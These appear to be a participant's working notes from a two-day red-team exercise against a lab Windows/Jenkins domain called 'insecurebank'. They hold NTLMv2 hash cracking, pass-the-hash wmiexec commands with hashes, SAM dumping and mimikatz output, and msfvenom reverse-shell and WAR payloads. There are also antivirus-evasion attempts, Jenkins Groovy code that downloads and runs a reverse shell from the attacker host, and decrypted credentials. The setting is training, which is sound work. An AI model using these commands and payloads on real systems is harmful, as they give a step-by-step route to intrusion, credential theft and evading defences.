* Commands

./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359 administrator@10.59.4.20

reverse handler:
msfconsole -x "use exploit/multi/handler;\
> set RHOST 10.59.4.100;\
> set LPORT 443;\
> run"

John
john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2 


* Challenge 1

Can you find Alice's password? Note refer to the attached responder output.

** Downloaded responder output txt
** see NTLM hash
[HTTP] NTLMv2 Client   : 10.58.122.100
[HTTP] NTLMv2 Username : ALICE\alice
[HTTP] NTLMv2 Hash     : alice::ALICE:1122334455667788:773EA54F06D1E9D58524469DAF1D5813:01010000000000007D80B569A678D10118E06AA31404B882000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000003000001EF1D3F15357FFB09A8667ACC2A6DA00A9497F87B70CA6192B1AA5BBBA8BC5540A0010000000000000000000000000000000000009001A0048005400540050002F0069006E007400720061006E00650074000000000000000000

+ Need to load password list into *john* 
john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2 

** output:

*Elefant15*        (alice)

1g 0:00:00:08 DONE (2019-06-27 10:59) 0.1145g/s 1282Kp/s 1282Kc/s 1282KC/s Eliseulove..Edward14.

* Challenge 2 

Can you find the NTLM hash for the local Administrator account? Flag format 32-hex

** Setup
*Note* Downloaded the openvpn profiles, will use the internal profile
~openvpn shared_533-redinternal.ovpn~
then login: password 0efaf267b804
username: shared
*Note* uncommented 

Old Alice's IP is:
*10.58.122.100*

New Alice IP is:
*10.59.4.20*



+ What would you do next with the password?
Some users could be local administrators on their systems, then you can connect back
to the systems and execute commands.

+ Interactions
  * remote powershell
  * WMI
  * smbexec
  * pth - pass the hash tools - start with ~pth-wmic~

** Log

fingerprinting the host with nmap
nmap -O -v 10.59.4.20

*** Nmap scan
Nmap scan report for 10.59.4.20
Host is up (0.089s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
MAC Address: 00:16:3E:2E:DE:40 (Xensource)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=6/27%OT=135%CT=1%CU=37656%PV=Y%DS=1%DC=D%G=Y%M=00163E%
OS:TM=5D14A79B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M52CNW8ST11%O2=M52CNW8ST11%O3=M52CNW8NNT11%O4=M52CNW8
OS:ST11%O5=M52CNW8ST11%O6=M52CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2
OS:000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M52CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=
OS:80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=80%CD=Z)

*** Pass the hash
~pth-wmic~ 
~wmiexec.py~
/usr/share/doc/python-impacket/examples/wmiexec.py
/usr/share/doc/python-impacket/examples/wmiexec.py

*** Remote shell
usage: wmiexec.py  alice:Elefant15@10.59.4.20

/usr/share/doc/python-impacket/examples/wmiexec.py alice:Elefant15@10.59.4.20

*got shell*

~whoami~:
insecurebank\alice

then dumped SAM and SYSTEM with 
reg save HKLM\SAM r-sam.hive
reg save HKLM\SYSTEM r-system.hive

donwloaded the dumps with ~get~ in wmi shell

*** Note: mimikatz help
[[https://blog.ropnop.com/practical-usage-of-ntlm-hashes/][Practical usage of ntlm hashes]]

Question: are we already a local admin?
We can check with ~whoami /groups~

*** TODO whoami (Windows)


+ When we have the hashes we can use samdump2
root@kali:~/Downloads# samdump2 r-system.hive r-sam.hive 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

*** Hash structure, username : something : LM hash : NTLM hash

*** TODO hashid (identify type of hash)

What do we do with the captured admin passwords?
We could use the admin password on *other workstations* that may have been imaged 
from the same image.

*** Logging in as administrator

~wmiexec~ also allows us to use Pass the Hash, so we can try to re-login into the administrator account

wmiexec has authentication 
 - hashes LMHASH:NTHASH

which in my case aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359

./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359 administrator@10.59.4.20

DOMAIN: insecurebank

we see there are different users - 'bob'

* Challenge 2.5

Store - we want to get credit card data

* Challenge 3
** Description
Edward's SSH key

Find Edward's ssh private key. Flag format: There is a 32-hex key on the DEK-Info line.

Trying to prepare metasploit payload

my local ip is 10.59.4.104

+ Reverse shell
msfvenom --payload windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai -i 5 LHOST=10.59.4.104 LPORT=443 > reverse-443.exe

+ Bind shell:
msfvenom --payload windows/meterpreter/bind_tcp --format exe --encoder x86/shikata_ga_nai -i 5 RHOST=10.59.4.20 LPORT=443 > bind-443.exe

*** TODO msfvenom cheat sheet
[[https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/][msfvenom cheat sheet]]

Try to create reverse shell
~msfconsole~
use exploit/multi/handler
set LHOST 10.59.4.104
set LPORT 443

Host 10.59.4.14:8080 is running Jenkins 2.125

It should have an information disclosure vulnerability:
https://www.cybersecurity-help.cz/vdb/SB2018121801

https://jenkins.io/security/advisory/2018-12-05/

** Network map
10.59.4.*
.14 - jenkins server
.13 - 
.20 - Alice, windows 8.1 - got password
.21 - Bob 
.22 - Charles - cannot run meterpreter
.23 - D - dave
.24 - E Edward - windows 8.1 9600
.25 - windows, fred - got password
 + Fred: WildFred8300

** Timeline 
14:28 - used mimikatz through metasploit 
~msv~ credentials - shows only Alice's credentials

14:30 - attempted to upload a reverse shell to .22 machine (charles)
- file gets disappeared
14:43

Extracted excel file from .25 - 
 + cracked the password - WildFred8300

14:48 - got meterpreter on .24
running ~msv~ shows users EDWARDS

running mimikatz_command -f samdump::hashes
shows 

15:00 captured prod.key from edwards
 - prod.key

15:20 - jenkins password
*** Jenkins job output of 
~cat /var/lib/jenkins/*.xml~

 <java.util.concurrent.CopyOnWriteArrayList>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>ffc2f9e0-02b6-4d34-8b16-96c22945f750</id>
          <description>test</description>
          <username></username>
          <password>{AQAAABAAAAAwwxpsXzQEg1RdEol3PEE1NrwNq8X8JMGTlffcz/yAS+CRsUGC1YgjuKqGU/c+C+M2gYJBvczf6pSx6hDXiIoC9w==}</password>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>24dad117-a27e-4c58-bb8a-f544564528b7</id>
          <description>Yoda User</description>
          <username></username>
          <password>{AQAAABAAAAAwejhWzh4CMShoXUyYgFOuzRwMpH7SWCj17VWni24Xhq/Vkiu2hQeQH07GQt8Ql7j9Zw/AK77a57VU+7VJG22/QA==}</password>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>7b5076ae-1f92-43bd-9459-d12eda67695d</id>
          <description>Tomcat Manager</description>
          <username></username>
          <password>{AQAAABAAAAAgpZgjaIfvHZiqDJFBXbvDTALaaa4jgkVj28x3VWNb9W/2Bfoa2X2k0bmRkYZltydM}</password>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
      </java.util.concurrent.CopyOnWriteArrayList>

*** Password decrypt in jenkins:
https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml

go to [jenkins]/script

*** Run this in jenkins script 
Jenkins script windows - http://10.59.4.13:8080/script
println(hudson.util.Secret.decrypt("{AQAAABAAAAAgpZgjaIfvHZiqDJFBXbvDTALaaa4jgkVj28x3VWNb9W/2Bfoa2X2k0bmRkYZltydM}"))

Tomcat manager:
Result: $zFSKM#o#S3QrDS!D(nq

Test 
password: 8I8_3Av|-:w7Y6|%_-0_^9t2IHRXL1~J

Yoda:
password: This is not the password you're looking for.

*** Vault - .13
http://10.59.4.13:8080/vsEncryptionPhrase

*** *Tomcat* exploitation

Password for the tomcat manager: 
Result: $zFSKM#o#S3QrDS!D(nq

manager url: http://10.59.4.13:8080/manager/
login: tomcat
Result: $zFSKM#o#S3QrDS!D(nq

Tomcat default credentials site: https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

Let's generate a reverse shell:
+ Reverse shell
msfvenom --payload java/meterpreter/reverse_tcp --format war LHOST=10.59.4.104 LPORT=443 > reverse443.war

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.59.4.104 LPORT=443 -f war > shell.war

nc -lnvp 443

*** environment variables from the tomcat server

export from the server:
export CHALLENGE_USER='*shared*'
export GPG_KEYS='05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 713DA88BE50911535FE716F5208B0AB1D63011C7 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 80FF76D88A969FE46108558A80B953A041E49465 8B39757B1D8A994DF2433ED58B3A601F08C975E5 A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 B3F49CD3B9BD2996DA90F817ED3873F5D3262722 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23'

~cat ~/hsqldb.scripts~
INSERT INTO VS_USER VALUES(1,'Administrator Account','root@localhost.com',TRUE,TRUE,'5033b55c74e5c56686f25bb6f2d21f79','Administrator','admin')

INSERT INTO VS_CREDENTIAL VALUES(1,NULL,NULL,'ssh passphrase for production machines',NULL,'VfaMEAdo2luxkvvnmMQ3EQ==',FALSE,NULL,NULL,NULL)
INSERT INTO VS_DATABASE_VERSION VALUES(1,0,'0.6.7')
INSERT INTO VS_ENCRYPTION_VERIFICATION VALUES(1,0,'X+94zVoou/pcz8CwUsb1y2YzLq0mK/kIzx5H1riOB5H2PqDyaacg+eOSmufFD9EqnN5XVBKJHbdbkWEXaHj0WUOBdG6mv/y/psN1gem46Io=')

md5 reverse of '5033b55c74e5c56686f25bb6f2d21f79' == funkeymonkey124

-> worked for Federico in Vault
-> username = admin, password was funkeymonkey124

OS on the .13 machine (Tomcat + Vault) is Ubuntu 16.04 LTS

*** ssh passphrase in the vault
Aiwaib6s

*** Menno cracked an excel file
The encrypted excel file was using a password which also worked for KeePass

*** TODO jenkins slave - Dev Server
http://10.59.4.14:8080/computer/dev_server/systemInfo
Java 10.0.1
Windows Server 2012 R2
user.name	DEV_SERVER$
10.59.4.12

* Observations from day 1

*** Better notekeeping - shared notes
*** Better oversight of getting to the goal
*** Keep track of 

** Veil evasion output
 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/CutePuppy.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/CutePuppy.rc


9:07
Running nmap against .12

**** nmap output 10.59.4.12
oot@kali:~/Downloads/22-c# nmap -sV 10.59.4.12
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 09:07 UTC
Nmap scan report for 10.59.4.12
Host is up (0.10s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 00:16:3E:3B:70:A9 (Xensource)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.38 seconds


9:12 - uploaded CutePuppy.bat to .21
tried to ~type~ the batch file, but it says 
Operation did not complete successfully because the file contains a virus or potentially unwanted software.

9:15 - generated a new one, with c# - seesaw.exe
9:21 - uploaded to the machine .21
9:21 - file disappeared after execution again (antivirus)

9:23 - generating new one with Veil - C
9:25 - caught by AV again

 slave
Running as a SYSTEM

JVM post-exploitation one-liners
https://gist.github.com/frohoff/a976928e3c1dc7c359f8
http://localhost:8080/reverse-443.exe

Host

*** Groovy code in Jenkins console

def remoteUrl = "http://10.59.4.100:8080/reverse-443.exe"
def file = new FileOutputStream("c:\\reverse-443.exe")
def out = new BufferedOutputStream(file)
out << new URL(remoteUrl).openStream()
out.close()

execute with 
println "c:\\reverse-2.exe".execute().text

Now we got a metasploit console at 9:40
~getsystem~

load mimikatz, then
meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : dev_server.insecurebank.local
BootKey    : 9e74a3487fcd17ded74f711fed041904

Administrator hash

Rid  : 500
User : Administrator
LM   : 
NTLM : e6aaafea4f9a779c5049081370e0bcbb

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1004
User : DEV_Admin
LM   : 
NTLM : fc0d2496db1c6fb501843b767d5cfd08

Rid  : 1005
User : olaf
LM   : 
NTLM : b222c55cf18c19101c1f49ba99e634e0

Jenkins slave - used groovy script console to download a reverse shell,
then used script console to execute the reverse shell
Then ran mimikatz in meterpreter to obtain samdump


** Looking into the .3 network

root@kali:~/Downloads# nmap -sn 10.59.3.0-255
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 10:18 UTC
Nmap scan report for 10.59.3.5
Host is up (0.0079s latency).
Nmap scan report for 10.59.3.8
Host is up (0.0067s latency).
Nmap scan report for 10.59.3.9
Host is up (0.0074s latency).
Nmap scan report for 10.59.3.10
Host is up (0.0066s latency).

*** Fred's password - 
rjgobM46@xLVZ4iq12Eo7FTFeL


10.59.4.17

10:43 - started scan of the 10.59.5.*
root@kali:~/Downloads# nmap -sP 10.59.5.0-255
Nmap done: 256 IP addresses (0 hosts up) scanned in 206.29 seconds

Yesterday 

Mimikatz:
if getting https://security.stackexchange.com/questions/137002/error-when-using-metasploit-mimikatz-module

Pass the hash with ntlm:
./wmiexec.py -hashes :fc0d2496db1c6fb501843b767d5cfd08 insecurebank\dev_admin@10.59.4.17
did't work as dev_admin is likely only a local account

*** domain users
running ~net user /domain~ on .12
c:\Program Files\Java\jre-10.0.1\bin>net user /domain
net user /domain
The request will be processed at a domain controller for domain insecurebank.local.


User accounts for \\DC1.insecurebank.local

-------------------------------------------------------------------------------
Administrator            alice                    bob                      
charles                  dave                     edward                   
fred                     Guest                    krbtgt                   
The command completed with one or more errors.

*** second administrator

./wmiexec.py -hashes :e6aaafea4f9a779c5049081370e0bcbb administrator@10.59.4.17
-> logon failure

* Machines on the network

.11 - kerberos, AD
.12 - Jenkins slave, reverse root shell
.13 - Apache Tomcat - vault, reverse root shell
.14 - Jenkins - shell, 
.15 - vnc, x11 - ** TODO
.16 - Windows server, RDP, netbios
.17 - windows server, RDP, netbios

** 10.59.4.16 - Windows Server
11:27 - connected via wmiexec using admin and the above hash

** Jenkins 

we connected via a simple reverse shell with groovy script pasted in Jenkins shell
Then were able to look into ~ (jenkins home) directory

** Cobalt strike
+ Used by APT and Red Team
+ Has a built in C2
+ Windows based implant
+ Includes pivoting features
+ Implants include mimikatz & psexec/wmiexec

+ Used when a system is already compromised
+ Shouldn't drop it as a first thing, go step by step, if they catch you, then you will burn your tools
+ The main idea is to start like a script kiddie (something basic), then if it fails, go to the next weapon
